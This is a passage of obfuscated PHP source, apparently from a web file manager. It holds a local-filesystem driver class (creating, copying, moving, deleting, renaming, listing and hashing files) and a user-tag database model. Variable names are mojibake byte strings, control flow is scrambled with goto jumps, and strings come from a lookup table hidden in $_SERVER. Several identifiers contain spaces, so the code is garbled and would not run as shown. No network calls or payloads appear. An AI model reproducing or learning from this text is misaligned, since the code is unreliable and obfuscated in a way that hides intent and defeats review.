$e©âÍå˜…°[1245]) { $fÒÑ∂·˜ÉÌ = BASIC_PATH . substr($fÒÑ∂·˜ÉÌ, 2); } $Eù”∑ﬂáÎÒ = KodIO::clear($Eù”∑ﬂáÎÒ); goto dóøﬂ‹œº±; dóøﬂ‹œº±: $fÒÑ∂·˜ÉÌ = KodIO::clear($fÒÑ∂·˜ÉÌ); $fÒÑ∂·˜ÉÌ = substr($fÒÑ∂·˜ÉÌ, strlen($Eù”∑ﬂáÎÒ)); if (empty($this->pathDriver)) { return $fÒÑ∂·˜ÉÌ; } goto A∂‘º¬âÚ‡; A∂‘º¬âÚ‡: return $this->pathDriver . $e©âÍå˜…°[8] . ltrim($fÒÑ∂·˜ÉÌ, $e©âÍå˜…°[8]); goto b”√àâ¢ãÍ; b”√àâ¢ãÍ: } public function mkfile($Bâê¥∫ﬂùÿ, $cä©øåÉ‚Õ = '', $AÕ§Ÿá‚Öæ = REPEAT_RENAME) { $Bâê¥∫ﬂùÿ = $this->iconvSystem($Bâê¥∫ﬂùÿ); @touch($Bâê¥∫ﬂùÿ); if ($cä©øåÉ‚Õ) { file_put_contents($Bâê¥∫ﬂùÿ, $cä©øåÉ‚Õ); } @chmod($Bâê¥∫ﬂùÿ, 511); return is_file($Bâê¥∫ﬂùÿ) ? $this->getPathOuter($Bâê¥∫ﬂùÿ) : !1; } public function mkdir($AÈÍè›øª¨, $dˆö∫≈Ô–Ö = REPEAT_SKIP) { $AÈÍè›øª¨ = $this->iconvSystem($AÈÍè›øª¨); if (is_dir($AÈÍè›øª¨)) { return $this->getPathOuter($AÈÍè›øª¨); } @mkdir($AÈÍè›øª¨, 511, !0); @chmod($AÈÍè›øª¨, 511); return is_dir($AÈÍè›øª¨) ? $this->getPathOuter($AÈÍè›øª¨) : !1; } public function copyFile($B˘›àπÇ†ª, $AÎÖ†´öçë) { $this->mkdir($this->pathFather($AÎÖ†´öçë)); $B˘›àπÇ†ª = $this->iconvSystem($B˘›àπÇ†ª); $AÎÖ†´öçë = $this->iconvSystem($AÎÖ†´öçë); $c±πÚ¥Ößº = copy_64($B˘›àπÇ†ª, $AÎÖ†´öçë); @chmod($AÎÖ†´öçë, 511); return $c±πÚ¥Ößº ? $this->getPathOuter($AÎÖ†´öçë) : !1; } public function moveFile($DΩ∫ü⁄ÉÇÀ, $E∂Èﬂºåù™) { goto AÑ¢Öã…Ì; dïæõû”ò®: $b‹«¡Ñ¢¯ß = intval(@rename($DΩ∫ü⁄ÉÇÀ, $E∂Èﬂºåù™)); if (!$b‹«¡Ñ¢¯ß) { if ($b‹«¡Ñ¢¯ß = intval(@copy_64($DΩ∫ü⁄ÉÇÀ, $E∂Èﬂºåù™))) { @unlink($DΩ∫ü⁄ÉÇÀ); } } @chmod($E∂Èﬂºåù™, 511); goto d∂œ Ñ¢ÒÜ; d∂œ Ñ¢ÒÜ: return $b‹«¡Ñ¢¯ß ? $this->getPathOuter($E∂Èﬂºåù™) : !1; goto bú”ÎÜ´¡™; AÑ¢Öã…Ì: $this->mkdir($this->pathFather($E∂Èﬂºåù™)); $DΩ∫ü⁄ÉÇÀ = $this->iconvSystem($DΩ∫ü⁄ÉÇÀ); $E∂Èﬂºåù™ = $this->iconvSystem($E∂Èﬂºåù™); goto dïæõû”ò®; bú”ÎÜ´¡™: } public function delFile($C±íí‡Âòó) { $C±íí‡Âòó = $this->iconvSystem($C±íí‡Âòó); if (!@unlink($C±íí‡Âòó)) { @chmod($C±íí‡Âòó, 511); if (!@unlink($C±íí‡Âòó)) { return !1; } } else { return !0; } } public function delFolder($eÍ≈Úƒ®ÂÏ) { goto d¢®Â√Ì¢¬; d¢®Â√Ì¢¬: $dÏêí¿‚˜• =& $_SERVER[ú∫]; $eÍ≈Úƒ®ÂÏ = $this->iconvSystem($eÍ≈Úƒ®ÂÏ); if (!is_dir($eÍ≈Úƒ®ÂÏ)) { return !0; } goto bÛ ùËë≥á; eì≥Ñ°ÒéÏ: return rmdir($eÍ≈Úƒ®ÂÏ); goto a•æÙ¢Óîº; bÛ ùËë≥á: if (!($Dˆä…ﬂàıÎ = opendir($eÍ≈Úƒ®ÂÏ))) { return !1; } while (($C ÇÎã¿”€ = readdir($Dˆä…ﬂàıÎ)) !== !1) { if ($C ÇÎã¿”€ == $dÏêí¿‚˜•[95] || $C ÇÎã¿”€ == $dÏêí¿‚˜•[1252]) { continue; } $e‰µ ¬≈é∂ = $eÍ≈Úƒ®ÂÏ . $dÏêí¿‚˜•[8] . $C ÇÎã¿”€; if (is_file($e‰µ ¬≈é∂) || is_link($e‰µ ¬≈é∂)) { if (!unlink($e‰µ ¬≈é∂)) { chmod($e‰µ ¬≈é∂, 511); if (!unlink($e‰µ ¬≈é∂)) { return !1; } } } else { if (is_dir($e‰µ ¬≈é∂)) { chmod($e‰µ ¬≈é∂, 511); $e‰µ ¬≈é∂ = $this->iconvApp($e‰µ ¬≈é∂); if (!$this->delFolder($e‰µ ¬≈é∂)) { return !1; } } } } closedir($Dˆä…ﬂàıÎ); goto eì≥Ñ°ÒéÏ; a•æÙ¢Óîº: } public function rename($A¡◊«ù™Ã≤, $aüªŸÏÿìò) { goto CÆŒ–∞◊∫ê; cºœóπñ≥∑: $A¡◊«ù™Ã≤ = $this->iconvSystem($A¡◊«ù™Ã≤); $c∑Âÿ¿ˆü¡ = $this->pathFather($A¡◊«ù™Ã≤); $bèíØ£©õÔ = rtrim($c∑Âÿ¿ˆü¡, $A≈‚ÏÓåºﬂ[8]) . $A≈‚ÏÓåºﬂ[8] . $fÖÀƒˆì¥Õ; goto aÔ•Ç∫º…Ò; aÔ•Ç∫º…Ò: $a˜óô∆íª¨ = @rename($A¡◊«ù™Ã≤, $bèíØ£©õÔ); $bèíØ£©õÔ = $this->iconvApp($bèíØ£©õÔ); return $a˜óô∆íª¨ ? $this->getPathOuter($bèíØ£©õÔ) : !1; goto DÃÈ§‰‹ç£; CÆŒ–∞◊∫ê: $A≈‚ÏÓåºﬂ =& $_SERVER[ú∫]; $fÖÀƒˆì¥Õ = $this->fileNameAuto($this->pathFather($A¡◊«ù™Ã≤), $aüªŸÏÿìò); $fÖÀƒˆì¥Õ = $this->iconvSystem($fÖÀƒˆì¥Õ); goto cºœóπñ≥∑; DÃÈ§‰‹ç£: } public function size($DÀÙ¿áã∑á) { $DÀÙ¿áã∑á = $this->iconvSystem($DÀÙ¿áã∑á); return filesize_64($DÀÙ¿áã∑á); } public function info($E¡ñ≥Èªå¨) { $E¡ñ≥Èªå¨ = $this->iconvSystem($E¡ñ≥Èªå¨); if ($this->isFolder($E¡ñ≥Èªå¨)) { return $this->folderInfo($E¡ñ≥Èªå¨); } else { if ($this->isFile($E¡ñ≥Èªå¨)) { return $this->fileInfo($E¡ñ≥Èªå¨); } } return !1; } protected function infoChildren($CÁ‚íæ‘⁄˘, &$D√áÌ‡—¡ª, $dÔ…ïì∂ó∆ = true) { goto AÑº˘ÒàÜå; AÑº˘ÒàÜå: $c£¶«Í∂©ñ =& $_SERVER[ú∫]; check_abort_echo(); $CÁ‚íæ‘⁄˘ = rtrim($CÁ‚íæ‘⁄˘, $c£¶«Í∂©ñ[8]) . $c£¶«Í∂©ñ[8]; goto A‘Æ≤ëÜªô; F≥àéÉµù¯: closedir($AñöÒúßê¨); goto cÍùïÖêß›; A‘Æ≤ëÜªô: if ($dÔ…ïì∂ó∆) { $CÁ‚íæ‘⁄˘ = $this->iconvSystem($CÁ‚íæ‘⁄˘); } if (!($AñöÒúßê¨ = @opendir($CÁ‚íæ‘⁄˘))) { return; } while (($F¢ªÂ¥ê≥æ = readdir($AñöÒúßê¨)) !== !1) { if ($F¢ªÂ¥ê≥æ == $c£¶«Í∂©ñ[95] || $F¢ªÂ¥ê≥æ == $c£¶«Í∂©ñ[1252]) { continue; } $C∫·á£á˘Ï = $CÁ‚íæ‘⁄˘ . $F¢ªÂ¥ê≥æ; if (is_file($C∫·á£á˘Ï) || is_link($C∫·á£á˘Ï)) { $D√áÌ‡—¡ª[$c£¶«Í∂©ñ[79]]++; $D√áÌ‡—¡ª[$c£¶«Í∂©ñ[78]] += filesize_64($C∫·á£á˘Ï); } else { if (is_dir($C∫·á£á˘Ï)) { $D√áÌ‡—¡ª[$c£¶«Í∂©ñ[80]]++; $this->infoChildren($C∫·á£á˘Ï, $D√áÌ‡—¡ª, !1); } } } goto F≥àéÉµù¯; cÍùïÖêß›: } private function folderInfo($c∂¢Áè‰ñÙ, $AßÙè±¶ÂÇ = false) { $AáΩ–ç†˘î =& $_SERVER[ú∫]; $c∂¢Áè‰ñÙ = rtrim($c∂¢Áè‰ñÙ, $AáΩ–ç†˘î[8]) . $AáΩ–ç†˘î[8]; $c∞ÆõÊøô‚ = $this->iconvApp($this->pathThis($c∂¢Áè‰ñÙ)); if ($AßÙè±¶ÂÇ) { return array($AáΩ–ç†˘î[28] => $c∞ÆõÊøô‚, $AáΩ–ç†˘î[76] => $this->getPathOuter($c∂¢Áè‰ñÙ), $AáΩ–ç†˘î[29] => $AáΩ–ç†˘î[77]); } $d∫ãÆÑÀø∂ = array($AáΩ–ç†˘î[28] => $c∞ÆõÊøô‚, $AáΩ–ç†˘î[76] => $this->getPathOuter($c∂¢Áè‰ñÙ), $AáΩ–ç†˘î[29] => $AáΩ–ç†˘î[77], $AáΩ–ç†˘î[194] => @filectime($c∂¢Áè‰ñÙ), $AáΩ–ç†˘î[84] => @filemtime($c∂¢Áè‰ñÙ), $AáΩ–ç†˘î[1255] => @fileatime($c∂¢Áè‰ñÙ), $AáΩ–ç†˘î[1256] => is_readable($c∂¢Áè‰ñÙ), $AáΩ–ç†˘î[1257] => is_writable($c∂¢Áè‰ñÙ), $AáΩ–ç†˘î[1258] => get_mode($c∂¢Áè‰ñÙ)); return $d∫ãÆÑÀø∂; } private function fileInfo($aÓ∫“¬⁄ ä, $câ¢º÷Ÿ»¬ = false) { $aé¢ÓØç±ﬂ =& $_SERVER[ú∫]; $F¡√‰ÑÿÑ¨ = $this->iconvApp($this->pathThis($aÓ∫“¬⁄ ä)); if ($câ¢º÷Ÿ»¬) { return array($aé¢ÓØç±ﬂ[28] => $F¡√‰ÑÿÑ¨, $aé¢ÓØç±ﬂ[76] => $this->getPathOuter($aÓ∫“¬⁄ ä), $aé¢ÓØç±ﬂ[29] => $aé¢ÓØç±ﬂ[193], $aé¢ÓØç±ﬂ[78] => $this->size($aÓ∫“¬⁄ ä), $aé¢ÓØç±ﬂ[168] => $this->ext($F¡√‰ÑÿÑ¨)); } $Bã£ÕüêÎã = array($aé¢ÓØç±ﬂ[28] => $F¡√‰ÑÿÑ¨, $aé¢ÓØç±ﬂ[76] => $this->getPathOuter($aÓ∫“¬⁄ ä), $aé¢ÓØç±ﬂ[29] => $aé¢ÓØç±ﬂ[193], $aé¢ÓØç±ﬂ[194] => @filectime($aÓ∫“¬⁄ ä), $aé¢ÓØç±ﬂ[84] => @filemtime($aÓ∫“¬⁄ ä), $aé¢ÓØç±ﬂ[1255] => @fileatime($aÓ∫“¬⁄ ä), $aé¢ÓØç±ﬂ[78] => $this->size($aÓ∫“¬⁄ ä), $aé¢ÓØç±ﬂ[168] => $this->ext($F¡√‰ÑÿÑ¨), $aé¢ÓØç±ﬂ[1256] => is_readable($aÓ∫“¬⁄ ä), $aé¢ÓØç±ﬂ[1257] => is_writable($aÓ∫“¬⁄ ä), $aé¢ÓØç±ﬂ[1258] => get_mode($aÓ∫“¬⁄ ä)); return $Bã£ÕüêÎã; } public function exist($E‡Ωæ◊∫áÓ) { $E‡Ωæ◊∫áÓ = $this->iconvSystem($E‡Ωæ◊∫áÓ); return @file_exists($E‡Ωæ◊∫áÓ); } public function isFile($cûÓ•˜–‰ÿ) { $cûÓ•˜–‰ÿ = $this->iconvSystem($cûÓ•˜–‰ÿ); return @is_file($cûÓ•˜–‰ÿ); } public function isFolder($B≥∂Ô£ô¯≥) { $B≥∂Ô£ô¯≥ = $this->iconvSystem($B≥∂Ô£ô¯≥); return @is_dir($B≥∂Ô£ô¯≥); } public function listPath($F´±≈ãÕÉÌ, $f≈Ñ“æ¿»á = false) { goto CñÔÈÙπä•; CñÔÈÙπä•: $Büââ∑å¬Ö =& $_SERVER[ú∫]; $F´±≈ãÕÉÌ = $this->iconvSystem($F´±≈ãÕÉÌ); $F´±≈ãÕÉÌ = rtrim($F´±≈ãÕÉÌ, $Büââ∑å¬Ö[8]) . $Büââ∑å¬Ö[8]; goto fêåá±º—¨; eü∞ﬂçÑø¢: closedir($Bà”ÔÆ–Ïó); return $F¿ˆ–‰Œ¥¶; goto dπﬁÈ›äÜÖ; fêåá±º—¨: $F¿ˆ–‰Œ¥¶ = array($Büââ∑å¬Ö[75] => array(), $Büââ∑å¬Ö[74] => array()); if (!($Bà”ÔÆ–Ïó = @opendir($F´±≈ãÕÉÌ))) { return $F¿ˆ–‰Œ¥¶; } while (($fˆ««ˆù‹å = readdir($Bà”ÔÆ–Ïó)) !== !1) { if ($fˆ««ˆù‹å == $Büââ∑å¬Ö[95] || $fˆ««ˆù‹å == $Büââ∑å¬Ö[1252]) { continue; } $FË´„â∆≤Ÿ = $F´±≈ãÕÉÌ . $fˆ««ˆù‹å; if (is_file($FË´„â∆≤Ÿ)) { $F¿ˆ–‰Œ¥¶[$Büââ∑å¬Ö[74]][] = $this->fileInfo($FË´„â∆≤Ÿ, $f≈Ñ“æ¿»á); } else { $F¿ˆ–‰Œ¥¶[$Büââ∑å¬Ö[75]][] = $this->folderInfo($FË´„â∆≤Ÿ, $f≈Ñ“æ¿»á); } } goto eü∞ﬂçÑø¢; dπﬁÈ›äÜÖ: } public function listAll($A˘áíÎì¯¶, &$b¡Í¨¿äø≥ = array()) { goto céΩÑºÇ∫; Eµù∫Ôåà˘: if (!($bÙ£Ü—òÖ∆ = @opendir($A˘áíÎì¯¶))) { return $b¡Í¨¿äø≥; } while (($b…ôıóØá¬ = readdir($bÙ£Ü—òÖ∆)) !== !1) { if ($b…ôıóØá¬ == $fÀçÈË∆á§[95] || $b…ôıóØá¬ == $fÀçÈË∆á§[1252]) { continue; } $EÉáëÙ¥â¬ = $A˘áíÎì¯¶ . $b…ôıóØá¬; if (is_dir($EÉáëÙ¥â¬) && !is_link($EÉáëÙ¥â¬)) { $b¡Í¨¿äø≥[] = array($fÀçÈË∆á§[76] => $EÉáëÙ¥â¬ . $fÀçÈË∆á§[8], $fÀçÈË∆á§[77] => 1, $fÀçÈË∆á§[84] => @filemtime($EÉáëÙ¥â¬), $fÀçÈË∆á§[78] => 0); $this->listAll($EÉáëÙ¥â¬, $b¡Í¨¿äø≥); } else { $b¡Í¨¿äø≥[] = array($fÀçÈË∆á§[76] => $EÉáëÙ¥â¬, $fÀçÈË∆á§[77] => 0, $fÀçÈË∆á§[84] => @filemtime($EÉáëÙ¥â¬), $fÀçÈË∆á§[78] => $this->size($EÉáëÙ¥â¬)); } } closedir($bÙ£Ü—òÖ∆); goto AéÍ†ò‡√ÿ; AéÍ†ò‡√ÿ: return $b¡Í¨¿äø≥; goto Dèˆ·ŒèÌ…; céΩÑºÇ∫: $fÀçÈË∆á§ =& $_SERVER[ú∫]; $A˘áíÎì¯¶ = $this->iconvSystem($A˘áíÎì¯¶); $A˘áíÎì¯¶ = rtrim($A˘áíÎì¯¶, $fÀçÈË∆á§[8]) . $fÀçÈË∆á§[8]; goto Eµù∫Ôåà˘; Dèˆ·ŒèÌ…: } public function has($bÃÖ◊∆«¢Í, $f˘”üΩ≈ƒ  = false, $DØÿ›Ë™”ò = true) { goto bÓˆ£ä≥Â¶; a…≤®˜·Ì∞: $Fä¬Ö‚©›÷ = 0; while (($a≠œó≈•äë = readdir($CªûË∑ÎÒ€)) !== !1) { if ($a≠œó≈•äë == $c£«Ö≈Ê÷ã[95] || $a≠œó≈•äë == $c£«Ö≈Ê÷ã[1252]) { continue; } $FÏ¿Îê–Ìî = $bÃÖ◊∆«¢Í . $a≠œó≈•äë; if ($f˘”üΩ≈ƒ ) { $Fä¬Ö‚©›÷++; if (@is_file($FÏ¿Îê–Ìî)) { $då∂ÈôÊ©∑++; } else { $a¨•®–Ö—í++; } if ($Fä¬Ö‚©›÷ > 10000) { break; } continue; } if ($DØÿ›Ë™”ò) { if (@is_file($FÏ¿Îê–Ìî)) { return !0; } } else { if (@is_dir($FÏ¿Îê–Ìî . $c£«Ö≈Ê÷ã[8])) { return !0; } } } closedir($CªûË∑ÎÒ€); goto eˆÆèø´èü; EÃÏªﬁ£≠±: if (!($CªûË∑ÎÒ€ = @opendir($bÃÖ◊∆«¢Í))) { return !1; } $då∂ÈôÊ©∑ = 0; $a¨•®–Ö—í = 0; goto a…≤®˜·Ì∞; bÓˆ£ä≥Â¶: $c£«Ö≈Ê÷ã =& $_SERVER[ú∫]; $bÃÖ◊∆«¢Í = $this->iconvSystem($bÃÖ◊∆«¢Í); $bÃÖ◊∆«¢Í = rtrim($bÃÖ◊∆«¢Í, $c£«Ö≈Ê÷ã[8]) . $c£«Ö≈Ê÷ã[8]; goto EÃÏªﬁ£≠±; eˆÆèø´èü: if ($f˘”üΩ≈ƒ ) { return array($c£«Ö≈Ê÷ã[203] => $då∂ÈôÊ©∑, $c£«Ö≈Ê÷ã[204] => $a¨•®–Ö—í); } return !1; goto EØ™”∞ñº°; EØ™”∞ñº°: } public function hashSimple($AÿÜÌÆ√–◊) { goto DˆÌÃ¬ëôÍ; D„Ë≤≠°á≤: fseek_64($aŸäë¯≤Í¥, $a•Ñ›®øè - $BÓê‘ÈÇ‰»); $BœÒÊ◊Êåò .= fread($aŸäë¯≤Í¥, $BÓê‘ÈÇ‰»); fclose($aŸäë¯≤Í¥); goto aÁÍ›Ôà¯è; BÁîø™∆Ë‡: $aŸäë¯≤Í¥ = fopen($AÿÜÌÆ√–◊, $a’ïúüÎ—Û[1259]); if (!$aŸäë¯≤Í¥) { return $BœÒÊ◊Êåò; } for ($DÆØˆîáá“ = 0; $DÆØˆîáá“ < $BÂ”ﬂôÁﬁÏ; $DÆØˆîáá“++) { fseek_64($aŸäë¯≤Í¥, $Fà»‘îàÈ« * $DÆØˆîáá“); $BœÒÊ◊Êåò .= fread($aŸäë¯≤Í¥, $BÓê‘ÈÇ‰»); } goto D„Ë≤≠°á≤; aÃ√çäûÎ’: $a•Ñ›®øè = $this->size($AÿÜÌÆ√–◊); $BÓê‘ÈÇ‰» = 200; $BÂ”ﬂôÁﬁÏ = 50; goto cô√ÃÊåçŸ; DˆÌÃ¬ëôÍ: $a’ïúüÎ—Û =& $_SERVER[ú∫]; if (!$AÿÜÌÆ√–◊) { return md5($a’ïúüÎ—Û[33]); } $AÿÜÌÆ√–◊ = $this->iconvSystem($AÿÜÌÆ√–◊); goto aÃ√çäûÎ’; cô√ÃÊåçŸ: if ($a•Ñ›®øè <= $BÓê‘ÈÇ‰» * $BÂ”ﬂôÁﬁÏ) { return $this->hashMd5($AÿÜÌÆ√–◊) . $a•Ñ›®øè; } $BœÒÊ◊Êåò = $a’ïúüÎ—Û[33]; $Fà»‘îàÈ« = intval($a•Ñ›®øè / $BÂ”ﬂôÁﬁÏ); goto BÁîø™∆Ë‡; aÁÍ›Ôà¯è: return md5($BœÒÊ◊Êåò) . $a•Ñ›®øè; goto b∑»Ñı±∑; b∑»Ñı±∑: } public function getContent($dÕë®Áõ‰) { $dÕë®Áõ‰ = $this->iconvSystem($dÕë®Áõ‰); return file_get_contents($dÕë®Áõ‰); } public function setContent($EÛÔŸÚ§§€, $Bë±ËÇÔÖ√ = '') { $EÛÔŸÚ§§€ = $this->iconvSystem($EÛÔŸÚ§§€); $Eõ•Û©Ü¬Ù = @file_put_contents($EÛÔŸÚ§§€, $Bë±ËÇÔÖ√, LOCK_EX); clearstatcache(); @chmod($EÛÔŸÚ§§€, 511); return $Eõ•Û©Ü¬Ù === !1 ? !1 : !0; } public function fileSubstr($FûÕ∂œÕÉ¢, $aØÊàòøÈ◊ = 0, $bâÓ¨Ó¢ÆÙ = false) { goto Bœ∆˜ÒûÚü; eá‚Ò√ÌÈ: fseek_64($bîÜ≈ï§øÍ, $aØÊàòøÈ◊); $dÂöÛ™ºìŒ = fread($bîÜ≈ï§øÍ, $bâÓ¨Ó¢ÆÙ); fclose($bîÜ≈ï§øÍ); goto F—Òë∏Ë…˘; Bœ∆˜ÒûÚü: $c±ìºÕ∞πº =& $_SERVER[ú∫]; $FûÕ∂œÕÉ¢ = $this->iconvSystem($FûÕ∂œÕÉ¢); if ($bâÓ¨Ó¢ÆÙ === !1) { $bâÓ¨Ó¢ÆÙ = $this->size($FûÕ∂œÕÉ¢); } goto dÌà€ÆΩ÷ü; dÌà€ÆΩ÷ü: if ($bâÓ¨Ó¢ÆÙ <= 0) { return $c±ìºÕ∞πº[33]; } $bîÜ≈ï§øÍ = fopen($FûÕ∂œÕÉ¢, $c±ìºÕ∞πº[1259]); if (!$bîÜ≈ï§øÍ) { return !1; } goto eá‚Ò√ÌÈ; F—Òë∏Ë…˘: return $dÂöÛ™ºìŒ; goto AºÙΩ«„–ƒ; AºÙΩ«„–ƒ: } public function upload($DïäÑÍ–Ëç, $Bó»Ω≥€À†, $B≤⁄’ÇÛ‹™ = false, $e§∂ﬂ“Œçú = REPEAT_REPLACE) { if ($B≤⁄’ÇÛ‹™) { return $this->moveFile($Bó»Ω≥€À†, $DïäÑÍ–Ëç); } return $this->copyFile($Bó»Ω≥€À†, $DïäÑÍ–Ëç); } public function setModifyTime($F…œÔØïë¡, $Dü√É†»™ß = '') { @touch($F…œÔØïë¡, intval($Dü√É†»™ß)); } public function download($C•ÛÉöõ≠À, $d∂°á”®ﬂ£) { return $this->iconvSystem($C•ÛÉöõ≠À); } } goto Eç≥è¯§ºÚ; A¿ò÷ê«ëŸ: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\163\x65\x72\137\146\x61\x76"; protected function cacheFunctionAlias($bÜµÜÍ¡ôë) { $bá®”ßî◊ =& $_SERVER[ú∫]; return array($bá®”ßî◊[1794] => array(USER_ID, $bá®”ßî◊[1795])); } protected function listData() { $a•∏àÑÍ—‘ =& $_SERVER[ú∫]; $bØŸãÒ£Üø = array($a•∏àÑÍ—‘[1520] => USER_ID, $a•∏àÑÍ—‘[463] => array($a•∏àÑÍ—‘[1798], 0)); $a∏ÿ√ÛıøÁ = $a•∏àÑÍ—‘[1800]; $b—Ê«êç‹ü = $this->field($a∏ÿ√ÛıøÁ)->where($bØŸãÒ£Üø)->order($a•∏àÑÍ—‘[1801])->select(); return $b—Ê«êç‹ü ? $b—Ê«êç‹ü : array(); } protected function listByTag($f“ÌÜÆ¨†≤) { } protected function addToTag($aûëÜˆ⁄Ö¢, $FóÓ¡Â¯Ó¨) { $A¿™ﬂò¶åë =& $_SERVER[ú∫]; if (!Model($A¿™ﬂò¶åë[1936])->listData($FóÓ¡Â¯Ó¨) || !Model($A¿™ﬂò¶åë[790])->pathInfo($aûëÜˆ⁄Ö¢)) { return !1; } $Eﬂçø˜»∑ı = array($A¿™ﬂò¶åë[1520] => USER_ID, $A¿™ﬂò¶åë[463] => $FóÓ¡Â¯Ó¨, $A¿™ﬂò¶åë[414] => $aûëÜˆ⁄Ö¢, $A¿™ﬂò¶åë[415] => $A¿™ﬂò¶åë[409], $A¿™ﬂò¶åë[413] => $A¿™ﬂò¶åë[33], $A¿™ﬂò¶åë[1696] => 0); if ($this->where($Eﬂçø˜»∑ı)->find()) { return !1; } return $this->add($Eﬂçø˜»∑ı); } protected function removeFromTag($e¥™∏ˆÁÍá, $aµ©éÂæ‡⁄) { $FÃª·÷éËÑ =& $_SERVER[ú∫]; if (!Model($FÃª·÷éËÑ[1936])->listData($aµ©éÂæ‡⁄)) { return !1; } if (is_array($e¥™∏ˆÁÍá)) { $e¥™∏ˆÁÍá = array($FÃª·÷éËÑ[7], $e¥™∏ˆÁÍá); } $D∞¶ÈãäâÕ = array($FÃª·÷éËÑ[1520] => USER_ID, $FÃª·÷éËÑ[463] => $aµ©éÂæ‡⁄, $FÃª·÷éËÑ[415] => $FÃª·÷éËÑ[409], $FÃª·÷éËÑ[414] => $e¥™∏ˆÁÍá); return $this->where($D∞¶ÈãäâÕ)->delete(); } protected function removeByTag($A¯ºìﬂÁùŒ) { $CÕá≥âÖ¶û =& $_SERVER[ú∫]; if (!$A¯ºìﬂÁùŒ) { return !1; } $eÜ‰ÎèøÈ— = array($CÕá≥âÖ¶û[1520] => USER_ID, $CÕá≥âÖ¶û[463] => $A¯ºìﬂÁùŒ); return $this->where($eÜ‰ÎèøÈ—)->delete(); } protected function removeBySource($E—®…‰º≈⁄) { $E◊®∆ÀÉ‡ä =& $_SERVER[ú∫]; if (is_array($E—®…‰º≈⁄)) { $E—®…‰º≈⁄ = array($E◊®∆ÀÉ‡ä[7], $E—®…‰º≈⁄); } $DÎŒùüª¢— = array($E◊®∆ÀÉ‡ä[1520] => USER_ID, $E◊®∆ÀÉ‡ä[414] => $E—®…‰º≈⁄, $E◊®∆ÀÉ‡ä[463] => array($E◊®∆ÀÉ‡ä[971], 0)); return $this->where($DÎŒùüª¢—)->delete(); } }